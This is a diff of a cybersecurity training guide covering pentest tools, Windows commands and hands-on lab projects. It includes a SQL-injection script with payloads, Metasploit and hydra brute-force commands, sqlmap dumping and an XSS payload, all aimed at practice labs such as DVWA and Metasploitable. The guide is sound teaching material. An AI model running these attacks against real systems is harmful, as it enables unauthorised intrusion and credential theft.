+| **Information Gathering** | nmap, theHarvester, recon-ng | Reconnaissance |
+| **Vulnerability Analysis** | OpenVAS, Nikto, SQLmap | Vulnerability discovery |
+| **Web Applications** | Burp Suite, OWASP ZAP, w3af | Web app testing |
+| **Database Assessment** | sqlmap, NoSQLMap | Database security |
+| **Password Attacks** | Hydra, John, Hashcat | Credential attacks |
+| **Wireless Attacks** | Aircrack-ng, Reaver, Wifite | WiFi security testing |
+| **Exploitation Tools** | Metasploit, Armitage | Exploit frameworks |
+| **Forensics** | Autopsy, Volatility | Digital forensics |
+
+**Specialized Testing Distributions**
+
+| Distribution | Focus | Key Features |
+|---|---|---|
+| **Kali Linux** | General penetration testing | 600+ security tools |
+| **Parrot Security** | Privacy and security | Lightweight, privacy-focused |
+| **BlackArch** | Arch-based security | 2000+ tools |
+| **Pentoo** | Gentoo-based testing | Live DVD/USB |
+
+#### Custom Tool Development
+
+**Scripting for Automation**
+
+```bash
+#!/bin/bash
+# Automated reconnaissance script
+
+TARGET=$1
+OUTPUT_DIR="recon_$TARGET"
+
+mkdir -p $OUTPUT_DIR
+
+# Subdomain enumeration
+echo "[+] Enumerating subdomains..."
+sublist3r -d $TARGET -o $OUTPUT_DIR/subdomains.txt
+
+# Port scanning
+echo "[+] Port scanning..."
+nmap -sS -sV -oA $OUTPUT_DIR/nmap_scan $TARGET
+
+# Web technology identification
+echo "[+] Identifying web technologies..."
+whatweb $TARGET > $OUTPUT_DIR/whatweb.txt
+
+# Directory enumeration
+echo "[+] Directory enumeration..."
+gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o $OUTPUT_DIR/directories.txt
+
+echo "[+] Reconnaissance complete. Results in $OUTPUT_DIR/"
+```
+
+**Python Exploitation Scripts**
+
+```python
+#!/usr/bin/env python3
+import requests
+import sys
+
+def exploit_sql_injection(url, payload):
+    """
+    Simple SQL injection exploitation example
+    """
+    data = {'username': payload, 'password': 'test'}
+    
+    try:
+        response = requests.post(url, data=data)
+        if "admin" in response.text:
+            print(f"[+] SQL Injection successful with payload: {payload}")
+            return True
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    
+    return False
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: python3 sql_inject.py <target_url>")
+        sys.exit(1)
+    
+    target_url = sys.argv[1]
+    payloads = [
+        "' OR '1'='1",
+        "admin'--",
+        "' UNION SELECT 1,2,3--"
+    ]
+    
+    for payload in payloads:
+        if exploit_sql_injection(target_url, payload):
+            break
+
+if __name__ == "__main__":
+    main()
+```
+
+### Reporting & Documentation
+
+#### Executive Summary
+
+**Key Components**
+
+| Section | Content | Audience |
+|---|---|---|
+| **Executive Summary** | High-level findings, business impact | C-level executives |
+| **Scope and Methodology** | Testing parameters, approach | Technical managers |
+| **Risk Assessment** | Vulnerability severity, likelihood | Risk managers |
+| **Recommendations** | Prioritized remediation steps | IT teams |
+| **Technical Findings** | Detailed vulnerabilities | Security engineers |
+
+#### Vulnerability Severity Rating
+
+**CVSS (Common Vulnerability Scoring System)**
+
+| Metric | Description | Values |
+|---|---|---|
+| **Attack Vector** | How the vulnerability is exploited | Network, Adjacent, Local, Physical |
+| **Attack Complexity** | Conditions beyond attacker control | Low, High |
+| **Privileges Required** | Level of privileges needed | None, Low, High |
+| **User Interaction** | Whether user interaction is required | None, Required |
+| **Scope** | Impact on other components | Unchanged, Changed |
+| **Impact** | Effect on confidentiality, integrity, availability | None, Low, High |
+
+**Internal Risk Rating**
+
+| Severity | CVSS Range | Description | Remediation Timeline |
+|---|---|---|---|
+| **Critical** | 9.0-10.0 | Immediate threat to business | 24-48 hours |
+| **High** | 7.0-8.9 | Significant security risk | 1 week |
+| **Medium** | 4.0-6.9 | Moderate security risk | 1 month |
+| **Low** | 0.1-3.9 | Minor security concern | 3 months |
+| **Informational** | 0.0 | No direct security impact | As resources permit |
+
+#### Professional Report Structure
+
+**1. Executive Summary**
+- Brief overview of engagement
+- Key findings summary
+- Overall risk assessment
+- High-level recommendations
+
+**2. Methodology**
+- Testing approach
+- Tools and techniques used
+- Scope and limitations
+- Testing timeline
+
+**3. Technical Findings**
+- Detailed vulnerability descriptions
+- Proof of concept exploits
+- Screenshots and evidence
+- CVSS scoring
+
+**4. Risk Analysis**
+- Business impact assessment
+- Likelihood of exploitation
+- Potential consequences
+- Risk matrix
+
+**5. Recommendations**
+- Prioritized remediation steps
+- Technical controls
+- Process improvements
+- Security awareness training
+
+#### Evidence Collection
+
+**Screenshot Standards**
+
+| Element | Requirement | Purpose |
+|---|---|---|
+| **Timestamp** | Visible in screenshots | Proof of testing timeline |
+| **URL/Command** | Full context visible | Reproducibility |
+| **Results** | Clear demonstration | Evidence of vulnerability |
+| **Annotations** | Highlighted key elements | Clarity for readers |
+
+**Command Output Documentation**
+
+```bash
+# Example: Documenting nmap scan
+echo "# Nmap scan performed on $(date)"
+echo "# Target: $TARGET"
+echo "# Command: nmap -sS -sV -oA scan_results $TARGET"
+nmap -sS -sV -oA scan_results $TARGET
+echo "# Scan completed at $(date)"
+```
+
+#### Remediation Validation
+
+**Re-testing Process**
+
+| Phase | Activities | Deliverables |
+|---|---|---|
+| **Planning** | Review original findings | Re-test plan |
+| **Validation** | Confirm fixes implemented | Validation results |
+| **Regression** | Test for new vulnerabilities | Updated risk assessment |
+| **Reporting** | Document remediation status | Final report addendum |
+
+**Remediation Tracking**
+
+| Status | Description | Actions Required |
+|---|---|---|
+| **Fixed** | Vulnerability successfully remediated | Document solution |
+| **Partially Fixed** | Mitigation in place, risk reduced | Monitor progress |
+| **Not Fixed** | No remediation attempted | Escalate to management |
+| **Cannot Fix** | Technical limitations prevent fix | Accept risk or compensating controls |
+
+### Specialized Testing Types
+
+#### Web Application Penetration Testing
+
+**Testing Workflow**
+
+1. **Application Mapping**
+   - Crawl application structure
+   - Identify entry points
+   - Map business logic flow
+
+2. **Authentication Testing**
+   - Username enumeration
+   - Password policy testing
+   - Session management review
+
+3. **Authorization Testing**
+   - Privilege escalation
+   - Forced browsing
+   - Parameter manipulation
+
+4. **Input Validation Testing**
+   - SQL injection
+   - Cross-site scripting
+   - Command injection
+
+#### Network Penetration Testing
+
+**Testing Phases**
+
+1. **External Testing**
+   - Internet-facing assets
+   - Public services enumeration
+   - Perimeter security assessment
+
+2. **Internal Testing**
+   - Network segmentation
+   - Lateral movement
+   - Domain compromise
+
+3. **Wireless Testing**
+   - WiFi security assessment
+   - Bluetooth testing
+   - RF analysis
+
+#### Mobile Application Testing
+
+**Testing Areas**
+
+| Platform | Focus Areas | Key Vulnerabilities |
+|---|---|---|
+| **iOS** | App Store binaries | Insecure storage, transport |
+| **Android** | APK analysis | Improper platform usage |
+| **Hybrid** | Web view security | Client-side injection |
+
+#### Cloud Security Testing
+
+**Testing Domains**
+
+| Service Model | Testing Focus | Key Areas |
+|---|---|---|
+| **IaaS** | Infrastructure security | VM security, network controls |
+| **PaaS** | Platform security | API security, data protection |
+| **SaaS** | Application security | Authentication, authorization |
+
+**Exercises: Penetration Testing**
+
+1. Develop a penetration testing methodology for your organization
+2. Create a professional penetration testing report template
+3. Practice vulnerability validation and exploitation
+4. Perform a complete web application penetration test using OWASP methodology
+
+---
+
+## 💻 Windows Command Line Mastery
+
+To be a complete cybersecurity professional, you must understand both Linux and Windows environments. This section covers essential Windows commands for administration, security, and penetration testing.
+
+### Windows Command Line Basics
+
+#### Command Prompt (cmd) vs PowerShell
+
+| Feature | Command Prompt (cmd) | PowerShell |
+|---|---|---|
+| **Objects** | Text-based | Object-based |
+| **Aliases** | Limited | Extensive |
+| **Scripting** | Batch files | Advanced scripting |
+| **Remote Management** | Limited | Built-in remoting |
+| **Tab Completion** | Basic | Advanced |
+
+### File and Directory Operations
+
+#### Basic Navigation and File Management
+
+| Task | CMD Command | PowerShell Command | Notes |
+|---|---|---|---|
+| **List directory** | `dir` | `Get-ChildItem` (alias: `ls`, `dir`) | PowerShell shows objects |
+| **Change directory** | `cd` | `Set-Location` (alias: `cd`) | Both support tab completion |
+| **Current directory** | `cd` (no args) | `Get-Location` (alias: `pwd`) | Print working directory |
+| **Create directory** | `mkdir dirname` | `New-Item -ItemType Directory dirname` | PowerShell more verbose |
+| **Copy files** | `copy source dest` | `Copy-Item source dest` | PowerShell handles objects |
+| **Move files** | `move source dest` | `Move-Item source dest` | Rename or relocate |
+| **Delete files** | `del filename` | `Remove-Item filename` | Use `-Force` for read-only |
+| **Delete directory** | `rmdir /s dirname` | `Remove-Item dirname -Recurse` | `-s` for subdirectories |
+
+#### Advanced File Operations
+
+**File Attributes and Permissions**
+
+| Command | Purpose | Example |
+|---|---|---|
+| `attrib` | View/modify file attributes | `attrib +h file.txt` (hide file) |
+| `icacls` | Advanced permissions | `icacls file.txt /grant user:F` |
+| `takeown` | Take ownership | `takeown /f file.txt` |
+| `cipher` | Encryption utilities | `cipher /e /s:C:\SecureFolder` |
+
+**PowerShell File Operations**
+
+```powershell
+# Get file properties
+Get-ItemProperty file.txt
+
+# Set file attributes
+Set-ItemProperty file.txt -Name Attributes -Value "Hidden,ReadOnly"
+
+# Get access control list
+Get-Acl file.txt
+
+# Set permissions
+$acl = Get-Acl file.txt
+$permission = "Domain\User","FullControl","Allow"
+$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
+$acl.SetAccessRule($accessRule)
+Set-Acl file.txt $acl
+```
+
+### System Information and Management
+
+#### System Information Commands
+
+| Command | Purpose | Example Output |
+|---|---|---|
+| `systeminfo` | Comprehensive system information | OS version, patches, hardware |
+| `hostname` | Computer name | DESKTOP-ABC123 |
+| `whoami` | Current user | DOMAIN\username |
+| `whoami /groups` | User group membership | Security groups |
+| `whoami /priv` | User privileges | Enabled privileges |
+| `ver` | OS version | Windows version |
+
+#### Hardware Information
+
+| Command | Purpose | Details |
+|---|---|---|
+| `wmic cpu get name` | CPU information | Processor details |
+| `wmic memorychip get capacity` | RAM information | Memory modules |
+| `wmic diskdrive get size,model` | Disk information | Hard drive details |
+| `wmic bios get serialnumber` | BIOS serial | Hardware identification |
+
+#### PowerShell System Information
+
+```powershell
+# Comprehensive system information
+Get-ComputerInfo
+
+# Specific hardware details
+Get-WmiObject Win32_Processor
+Get-WmiObject Win32_PhysicalMemory
+Get-WmiObject Win32_LogicalDisk
+
+# Operating system information
+Get-WmiObject Win32_OperatingSystem
+```
+
+### Process and Service Management
+
+#### Process Management
+
+| Task | CMD Command | PowerShell Command | Notes |
+|---|---|---|---|
+| **List processes** | `tasklist` | `Get-Process` | PowerShell shows objects |
+| **Kill process** | `taskkill /PID 1234` | `Stop-Process -Id 1234` | Use PID or name |
+| **Kill by name** | `taskkill /IM notepad.exe` | `Stop-Process -Name notepad` | All instances |
+| **Process details** | `tasklist /v` | `Get-Process | Format-Table -Property *` | Verbose output |
+
+#### Service Management
+
+| Task | CMD Command | PowerShell Command | Notes |
+|---|---|---|---|
+| **List services** | `sc query` | `Get-Service` | All services |
+| **Service status** | `sc query servicename` | `Get-Service servicename` | Specific service |
+| **Start service** | `sc start servicename` | `Start-Service servicename` | Requires privileges |
+| **Stop service** | `sc stop servicename` | `Stop-Service servicename` | Graceful shutdown |
+| **Service config** | `sc qc servicename` | `Get-WmiObject Win32_Service | Where Name -eq "servicename"` | Configuration details |
+
+**Advanced Service Management**
+
+```powershell
+# Get service dependencies
+Get-Service -Name "ServiceName" -DependentServices
+
+# Get services that depend on this service
+Get-Service -Name "ServiceName" -RequiredServices
+
+# Change service startup type
+Set-Service -Name "ServiceName" -StartupType Disabled
+
+# Create new service
+New-Service -Name "MyService" -BinaryPathName "C:\path\to\service.exe"
+```
+
+### Network Commands
+
+#### Network Configuration
+
+| Command | Purpose | Example |
+|---|---|---|
+| `ipconfig` | IP configuration | `ipconfig /all` |
+| `ipconfig /release` | Release IP address | DHCP environments |
+| `ipconfig /renew` | Renew IP address | DHCP environments |
+| `ipconfig /flushdns` | Clear DNS cache | DNS troubleshooting |
+| `getmac` | MAC addresses | Physical addresses |
+
+#### Network Connectivity
+
+| Command | Purpose | Notes |
+|---|---|---|
+| `ping hostname` | Test connectivity | ICMP echo requests |
+| `tracert hostname` | Trace route | Path to destination |
+| `nslookup hostname` | DNS lookup | Name resolution |
+| `arp -a` | ARP table | MAC address mappings |
+| `route print` | Routing table | Network routes |
+
+#### Network Statistics
+
+| Command | Purpose | Key Options |
+|---|---|---|
+| `netstat -an` | Network connections | All connections, numeric |
+| `netstat -b` | Show executable | Requires admin rights |
+| `netstat -o` | Show PID | Process identification |
+| `netstat -r` | Routing table | Same as `route print` |
+
+**PowerShell Network Commands**
+
+```powershell
+# Network adapter information
+Get-NetAdapter
+
+# IP configuration
+Get-NetIPConfiguration
+
+# TCP connections with process information
+Get-NetTCPConnection | Format-Table LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess
+
+# DNS cache
+Get-DnsClientCache
+
+# Clear DNS cache
+Clear-DnsClientCache
+```
+
+### User and Group Management
+
+#### User Account Management
+
+| Task | CMD Command | PowerShell Command |
+|---|---|---|
+| **List users** | `net user` | `Get-LocalUser` |
+| **User details** | `net user username` | `Get-LocalUser username` |
+| **Create user** | `net user newuser password /add` | `New-LocalUser -Name "newuser" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)` |
+| **Delete user** | `net user username /delete` | `Remove-LocalUser username` |
+| **Change password** | `net user username newpassword` | `Set-LocalUser -Name username -Password (ConvertTo-SecureString "newpass" -AsPlainText -Force)` |
+
+#### Group Management
+
+| Task | CMD Command | PowerShell Command |
+|---|---|---|
+| **List groups** | `net localgroup` | `Get-LocalGroup` |
+| **Group members** | `net localgroup groupname` | `Get-LocalGroupMember groupname` |
+| **Add to group** | `net localgroup groupname username /add` | `Add-LocalGroupMember -Group groupname -Member username` |
+| **Remove from group** | `net localgroup groupname username /delete` | `Remove-LocalGroupMember -Group groupname -Member username` |
+
+#### Domain Operations
+
+```cmd
+# Domain user information
+net user username /domain
+
+# Domain groups
+net group /domain
+
+# Domain controllers
+nltest /dclist:domain.com
+
+# Trust relationships
+nltest /trusted_domains
+```
+
+### Registry Operations
+
+#### Registry Basics
+
+| Task | Command | Purpose |
+|---|---|---|
+| **Query registry** | `reg query HKEY_LOCAL_MACHINE\SOFTWARE` | Read registry values |
+| **Add registry key** | `reg add HKLM\SOFTWARE\MyApp /v Setting /t REG_SZ /d Value` | Create registry entry |
+| **Delete registry key** | `reg delete HKLM\SOFTWARE\MyApp /v Setting` | Remove registry entry |
+| **Export registry** | `reg export HKLM\SOFTWARE\MyApp backup.reg` | Backup registry section |
+| **Import registry** | `reg import backup.reg` | Restore registry section |
+
+#### PowerShell Registry Operations
+
+```powershell
+# Read registry value
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name "ProgramFilesDir"
+
+# Set registry value
+Set-ItemProperty -Path "HKLM:\SOFTWARE\MyApp" -Name "Setting" -Value "NewValue"
+
+# Create registry key
+New-Item -Path "HKLM:\SOFTWARE\MyApp"
+
+# Remove registry key
+Remove-Item -Path "HKLM:\SOFTWARE\MyApp" -Recurse
+```
+
+### Security and Auditing
+
+#### Event Log Management
+
+| Command | Purpose | Example |
+|---|---|---|
+| `eventquery` | Query event logs | Legacy command |
+| `wevtutil` | Event log utility | `wevtutil qe Security /c:10` |
+
+**PowerShell Event Log Commands**
+
+```powershell
+# Get recent security events
+Get-EventLog -LogName Security -Newest 100
+
+# Filter events by event ID
+Get-EventLog -LogName Security -InstanceId 4624
+
+# Export event logs
+Get-EventLog -LogName Security | Export-Csv security_events.csv
+
+# Get Windows logs
+Get-WinEvent -ListLog *
+
+# Query specific log
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50
+```
+
+#### Security Policy and Auditing
+
+| Command | Purpose | Usage |
+|---|---|---|
+| `secedit` | Security policy | `secedit /export /cfg policy.inf` |
+| `auditpol` | Audit policy | `auditpol /get /category:*` |
+| `gpresult` | Group Policy results | `gpresult /r` |
+| `rsop.msc` | Group Policy (GUI) | Resultant Set of Policy |
+
+### PowerShell for Security Professionals
+
+#### Advanced PowerShell Techniques
+
+**Object Manipulation**
+
+```powershell
+# Filter and select objects
+Get-Process | Where-Object {$_.CPU -gt 100} | Select-Object Name, CPU
+
+# Sort objects
+Get-Service | Sort-Object Status, Name
+
+# Group objects
+Get-EventLog -LogName System -Newest 1000 | Group-Object EntryType
+
+# Measure objects
+Get-ChildItem C:\ -Recurse | Measure-Object -Property Length -Sum
+```
+
+**Remote Management**
+
+```powershell
+# Enable PowerShell remoting
+Enable-PSRemoting -Force
+
+# Remote command execution
+Invoke-Command -ComputerName Server01 -ScriptBlock {Get-Process}
+
+# Interactive remote session
+Enter-PSSession -ComputerName Server01
+
+# Remote file operations
+Copy-Item C:\file.txt -Destination \\Server01\C$\temp\
+```
+
+#### Security-Focused PowerShell
+
+**System Reconnaissance**
+
+```powershell
+# Get installed software
+Get-WmiObject -Class Win32_Product | Select-Object Name, Version
+
+# Network connections with process names
+Get-NetTCPConnection | ForEach-Object {
+    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
+    $_ | Add-Member -NotePropertyName ProcessName -NotePropertyValue $proc.ProcessName -PassThru
+} | Format-Table LocalAddress, LocalPort, RemoteAddress, RemotePort, State, ProcessName
+
+# Check for suspicious scheduled tasks
+Get-ScheduledTask | Where-Object {$_.TaskName -like "*temp*" -or $_.TaskName -like "*update*"}
+
+# Find files with specific attributes
+Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue | 
+Where-Object {$_.Attributes -match "Hidden"}
+```
+
+### Batch Scripting and Automation
+
+#### Batch File Basics
+
+```batch
+@echo off
+REM Basic batch script structure
+
+:: Variables
+set USERNAME=admin
+set PASSWORD=P@ssw0rd
+
+:: Conditional statements
+if "%USERNAME%"=="admin" (
+    echo Administrator detected
+) else (
+    echo Regular user
+)
+
+:: Loops
+for /f "tokens=*" %%i in ('dir /b *.txt') do (
+    echo Processing file: %%i
+)
+
+:: Functions
+call :ProcessFile "example.txt"
+goto :end
+
+:ProcessFile
+echo Processing %1
+goto :eof
+
+:end
+echo Script completed
+```
+
+#### Advanced Batch Techniques
+
+```batch
+@echo off
+:: Security assessment script
+
+echo Starting security assessment...
+
+:: Check for admin privileges
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    echo Running with administrator privileges
+) else (
+    echo WARNING: Not running as administrator
+)
+
+:: System information
+echo === SYSTEM INFORMATION ===
+systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+:: Running processes
+echo === SUSPICIOUS PROCESSES ===
+tasklist | findstr /i "cmd.exe powershell.exe"
+
+:: Network connections
+echo === NETWORK CONNECTIONS ===
+netstat -an | findstr ESTABLISHED
+
+:: Event log errors
+echo === RECENT ERRORS ===
+wevtutil qe System /q:"*[System[Level=2]]" /c:5 /rd:true /f:text
+
+echo Assessment completed. Review output above.
+pause
+```
+
+### Windows Security Commands Reference
+
+#### Security Assessment Commands
+
+| Purpose | Command | Notes |
+|---|---|---|
+| **List shares** | `net share` | Network shares |
+| **Open sessions** | `net session` | Active sessions |
+| **Password policy** | `net accounts` | Local password policy |
+| **Locked out users** | `net user | findstr "Locked"` | Account lockouts |
+| **Local admin group** | `net localgroup administrators` | Admin accounts |
+| **Startup programs** | `wmic startup get command,caption` | Auto-start programs |
+| **Installed patches** | `wmic qfe list` | System updates |
+| **Environment variables** | `set` | System variables |
+
+**Exercises: Windows Command Line**
+
+1. Create a batch script to gather system information for security assessment
+2. Use PowerShell to audit user accounts and group memberships
+3. Write a PowerShell script to monitor for suspicious network connections
+4. Practice registry operations for security configuration
+5. Create an automated Windows hardening script
+
+---
+
+## 🏆 Practical Projects & Hands-On Labs
+
+Real-world experience is invaluable. This section provides structured projects to apply your knowledge and build a professional portfolio.
 
 ### Lab Environment Setup
 
-**Virtual Lab with VirtualBox/VMware:**
-```bash
-# VirtualBox management
-VBoxManage list vms                 # List virtual machines
-VBoxManage startvm "VM Name"        # Start VM
-VBoxManage controlvm "VM Name" poweroff  # Power off VM
+#### Virtual Laboratory Components
 
-# Create test environment
-VBoxManage createvm --name "TestLab" --register
-VBoxManage modifyvm "TestLab" --memory 2048 --cpus 2
-VBoxManage createhd --filename TestLab.vdi --size 20000
-VBoxManage storagectl "TestLab" --name "SATA Controller" --add sata
-VBoxManage storageattach "TestLab" --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium TestLab.vdi
+| Component | Purpose | Recommended Software | Specifications |
+|---|---|---|---|
+| **Hypervisor** | VM management | VMware Workstation, VirtualBox | 16GB+ RAM, 500GB+ storage |
+| **Attacking Machine** | Penetration testing | Kali Linux, Parrot Security OS | 4GB RAM, 50GB storage |
+| **Target Systems** | Practice targets | Metasploitable, DVWA, VulnHub VMs | Various configurations |
+| **Network Simulation** | Realistic networking | GNS3, EVE-NG | Network device emulation |
+| **Vulnerable Applications** | Web app testing | WebGoat, bWAPP, Damn Vulnerable Web App | Application security |
+
+#### Essential Lab VMs
+
+**Vulnerable Systems for Practice**
+
+| System | Type | Focus Area | Download Source |
+|---|---|---|---|
+| **Metasploitable 2** | Linux vulnerable VM | Network penetration testing | Rapid7 |
+| **DVWA** | Web application | OWASP Top 10 vulnerabilities | GitHub |
+| **VulnHub VMs** | Various scenarios | Specific vulnerabilities | VulnHub.com |
+| **HackTheBox VMs** | CTF-style challenges | Real-world scenarios | HackTheBox.eu |
+| **TryHackMe Rooms** | Guided learning | Structured tutorials | TryHackMe.com |
+| **OverTheWire** | Wargames | Command line skills | OverTheWire.org |
+
+#### Network Topology Design
+
+```
+┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
+│   Kali Linux    │    │   pfSense       │    │  Vulnerable     │
+│   (Attacker)    │────│   (Firewall)    │────│   Network       │
+│   192.168.1.100 │    │   Gateway       │    │   192.168.2.0/24│
+└─────────────────┘    └─────────────────┘    └─────────────────┘
+                              │
+                    ┌─────────────────┐
+                    │   Monitoring    │
+                    │   (Security     │
+                    │   Onion/SIEM)   │
+                    │   192.168.3.100 │
+                    └─────────────────┘
 ```
 
-**Docker Lab Environment:**
-```yaml
-# docker-compose.yml for security lab
-version: '3.8'
-services:
-  kali:
-    image: kalilinux/kali-rolling
-    container_name: kali-lab
-    stdin_open: true
-    tty: true
-    volumes:
-      - ./shared:/shared
-    networks:
-      - lab-network
+### Project 1: Complete Network Penetration Test
 
-  ubuntu-target:
-    image: ubuntu:20.04
-    container_name: ubuntu-target
-    stdin_open: true
-    tty: true
-    volumes:
-      - ./shared:/shared
-    networks:
-      - lab-network
+**Objective**: Conduct a full penetration test against a network of vulnerable systems.
 
-  vulnerable-app:
-    image: vulnerables/web-dvwa
-    container_name: dvwa
-    ports:
-      - "8080:80"
-    networks:
-      - lab-network
+**Lab Setup Requirements**:
+- Kali Linux (attacker)
+- Metasploitable 2 (target 1)
+- Windows XP SP2 (target 2)  
+- Windows Server 2008 (target 3)
+- pfSense firewall
 
-networks:
-  lab-network:
-    driver: bridge
-    ipam:
-      config:
-        - subnet: 172.20.0.0/16
-```
+**Project Phases**:
 
-### Server Administration
+1. **Information Gathering**
+   ```bash
+   # Network discovery
+   nmap -sn 192.168.1.0/24
+   
+   # Port scanning
+   nmap -sS -sV -O 192.168.1.0/24
+   
+   # Service enumeration
+   nmap --script vuln 192.168.1.100-110
+   ```
 
-**Web Server Setup (LEMP Stack):**
-```bash
-#!/bin/bash
-# LEMP Stack Installation Script
+2. **Vulnerability Assessment**
+   ```bash
+   # Web application scanning
+   nikto -h http://192.168.1.100
+   
+   # SMB enumeration
+   enum4linux 192.168.1.101
+   
+   # SSL/TLS testing
+   sslscan 192.168.1.100:443
+   ```
 
-# Update system
-sudo apt update && sudo apt upgrade -y
+3. **Exploitation**
+   ```bash
+   # Metasploit exploitation
+   msfconsole
+   use exploit/multi/samba/usermap_script
+   set RHOSTS 192.168.1.100
+   exploit
+   ```
 
-# Install Nginx
-sudo apt install nginx -y
-sudo systemctl start nginx
-sudo systemctl enable nginx
+4. **Post-Exploitation**
+   ```bash
+   # Privilege escalation
+   find / -perm -4000 2>/dev/null
+   
+   # Persistence
+   crontab -e
+   
+   # Lateral movement
+   ssh-keygen -t rsa
+   ssh-copy-id user@192.168.1.101
+   ```
 
-# Install MySQL
-sudo apt install mysql-server -y
-sudo mysql_secure_installation
+**Deliverables**:
+- Network diagram
+- Vulnerability assessment report
+- Exploitation documentation
+- Remediation recommendations
 
-# Install PHP
-sudo apt install php-fpm php-mysql php-curl php-gd php-mbstring php-xml php-zip -y
+### Project 2: Web Application Security Assessment
 
-# Configure Nginx for PHP
-sudo tee /etc/nginx/sites-available/default > /dev/null << 'EOF'
-server {
-    listen 80 default_server;
-    root /var/www/html;
-    index index.php index.html;
-    server_name _;
+**Objective**: Perform comprehensive security testing of a web application.
 
-    location / {
-        try_files $uri $uri/ =404;
-    }
+**Target Applications**:
+- DVWA (Damn Vulnerable Web Application)
+- WebGoat
+- Mutillidae II
+- bWAPP
 
-    location ~ \.php$ {
-        include snippets/fastcgi-php.conf;
-        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
-    }
-}
-EOF
+**Testing Methodology**:
 
-# Test PHP
-echo "<?php phpinfo(); ?>" | sudo tee /var/www/html/info.php
+1. **Information Gathering**
+   ```bash
+   # Technology identification
+   whatweb http://dvwa.local
+   
+   # Directory enumeration
+   gobuster dir -u http://dvwa.local -w /usr/share/wordlists/dirb/common.txt
+   
+   # Parameter discovery
+   wfuzz -w /usr/share/wordlists/burp-parameter-names.txt --hh 0 http://dvwa.local/vulnerabilities/sqli/?FUZZ=test
+   ```
 
-# Restart services
-sudo systemctl restart nginx
-sudo systemctl restart php8.1-fpm
+2. **Authentication Testing**
+   ```bash
+   # Brute force attack
+   hydra -l admin -P /usr/share/wordlists/rockyou.txt dvwa.local http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+   ```
 
-echo "LEMP stack installed successfully!"
-echo "Visit http://your-server-ip/info.php to test PHP"
-```
+3. **Input Validation Testing**
+   ```bash
+   # SQL injection with SQLmap
+   sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" --dbs
+   
+   # XSS testing
+   # Manual payload testing in forms and URL parameters
+   <script>alert('XSS')</script>
+   ```
 
-**Database Administration:**
-```bash
-# MySQL/MariaDB administration
-sudo mysql -u root -p
-CREATE DATABASE myapp;
-CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'strong_password';
-GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
-FLUSH PRIVILEGES;
+4. **Business Logic Testing**
+   - File upload vulnerabilities
+   - Race condition testing  
+   - Workflow bypass attempts
 
-# PostgreSQL administration
-sudo -u postgres createdb myapp
-sudo -u postgres createuser appuser
-sudo -u postgres psql -c "ALTER USER appuser PASSWORD 'strong_password';"
-sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;"
+**Deliverables**:
+- Web application security report
+- Proof-of-concept exploits
+- Secure coding recommendations
 
-# Database backup scripts
-#!/bin/bash
-# MySQL backup
-mysqldump -u root -p myapp > backup_$(date +%Y%m%d).sql
+### Project 3: Incident Response Simulation
 
-# PostgreSQL backup
-pg_dump -U appuser myapp > backup_$(date +%Y%m%d).sql
+**Objective**: Simulate a security incident and practice incident response procedures.
 
-# Automated backup with compression and rotation
-tar -czf backup_$(date +%Y%m%d).tar.gz backup_$(date +%Y%m%d).sql
-find /backup -name "backup_*.tar.gz" -mtime +7 -delete
-```
+**Scenario**: APT attack with multiple compromise indicators
 
-### Security Challenges
+**Lab Components**:
+- Windows domain environment
+- Linux web servers
+- Network monitoring tools
+- Log aggregation system
 
-**Vulnerable Application Setup:**
-```bash
-# DVWA (Damn Vulnerable Web Application)
-docker run -d -p 8080:80 vulnerables/web-dvwa
+**Incident Timeline**:
 
-# Metasploitable (Vulnerable Linux)
-# Download from Rapid7 website
-# Run in isolated network environment
+1. **Initial Compromise** (Day 1)
+   - Phishing email with malicious attachment
+   - User executes malware
+   - C2 communication established
 
-# WebGoat (OWASP Web Security Training)
-docker run -d -p 8081:8080 webgoat/goatandwolf
+2. **Reconnaissance** (Day 2-3)
+   - Network scanning from compromised host
+   - Credential harvesting
+   - Domain enumeration
 
-# VulnHub VMs
-# Download various vulnerable VMs from vulnhub.com
-```
+3. **Lateral Movement** (Day 4-5)
+   - Pass-the-hash attacks
+   - Service account compromise
+   - Additional system compromise
 
-**Security Testing Checklist:**
-```bash
-#!/bin/bash
-# Security assessment script
+4. **Data Exfiltration** (Day 6)
+   - Database access
+   - Sensitive file identification
+   - Data staging and exfiltration
 
-echo "=== Security Assessment Started ==="
+**Response Activities**:
 
-# Network scan
-nmap -sS -sV -O $TARGET_IP > nmap_results.txt
+1. **Detection**
+   ```bash
+   # Analyze network logs
+   tcpdump -r capture.pcap | grep "suspicious.domain.com"
+   
+   # Check DNS logs
+   grep "suspicious.domain.com" /var/log/named/queries.log
+   
+   # Review proxy logs
+   grep "data exfiltration patterns" /var/log/squid/access.log
+   ```
 
-# Web application scan
-nikto -h http://$TARGET_IP > nikto_results.txt
+2. **Investigation**
+   ```bash
+   # Memory analysis
+   volatility -f memory.dump --profile=Win7SP1x64 pslist
+   volatility -f memory.dump --profile=Win7SP1x64 netscan
+   
+   # Disk forensics
+   autopsy disk_image.dd
+   
+   # Log correlation
+   grep -i "user login" /var/log/auth.log | sort | uniq
+   ```
 
-# SSL/TLS assessment
-sslscan $TARGET_IP:443 > ssl_results.txt
+3. **Containment**
+   - Network isolation
+   - Account disabling
+   - System shutdown procedures
 
-# Check for common vulnerabilities
-# SQL injection test
